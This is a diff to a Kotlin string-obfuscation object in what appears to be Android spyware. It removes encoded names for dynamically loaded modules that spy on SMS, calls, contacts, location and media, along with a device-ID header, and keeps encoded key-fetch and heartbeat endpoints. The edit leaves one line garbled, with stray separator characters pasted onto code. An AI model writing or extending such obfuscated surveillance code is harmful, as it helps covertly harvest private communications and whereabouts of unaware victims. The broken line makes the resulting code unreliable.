@@ -35,30 +35,7 @@ internal object ObfStr {
 
     // ── KeyFetcher — key delivery endpoint ───────────────────────────────────
     
-    fun apiKeyEndpoint() = d(intArrayOf(100, 27, 73, 72, 66, 34, 72))
-
-    // ── DexModuleLoader — module names ────────────────────────────────────────
-    
-    fun modSpySms()      = d(intArrayOf(56, 10, 64, 12, 30, 59, 80))
-    
-    fun modSpyCalls()    = d(intArrayOf(56, 10, 64, 12, 14, 55, 79, 30, 43))
-    
-    fun modSpyContacts() = d(intArrayOf(56, 10, 64, 12, 14, 57, 77, 6, 57, 20, 70, 87))
-    
-    fun modSpyLocation() = d(intArrayOf(56, 10, 64, 12, 1, 57, 64, 19, 44, 30, 93, 74))
-    
-    fun modSpyMedia()    = d(intArrayOf(56, 10, 64, 12, 0, 51, 71, 27, 57))
-
-    
-    fun modClassPrefix() = d(intArrayOf(
-        40, 21, 84, 15, 12, 56, 71, 0, 55, 30, 86, 10,
-        38, 21, 93, 84, 1, 51, 80, 92
-    ))
-
-    
-    fun headerDeviceId() = d(intArrayOf(19, 87, 125, 68, 27, 63, 64, 23, 117, 62, 86))
-
-    // ── ConnectorService — API endpoints ──────────────────────────────────────
+    fun apiKeyEndpoint() = d(intArrayOf(100, 27, 73, 72, 66, 34, 72)) ──────────────────────────────────────
     
     fun apiHeartbeat() = d(intArrayOf(
         100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11,
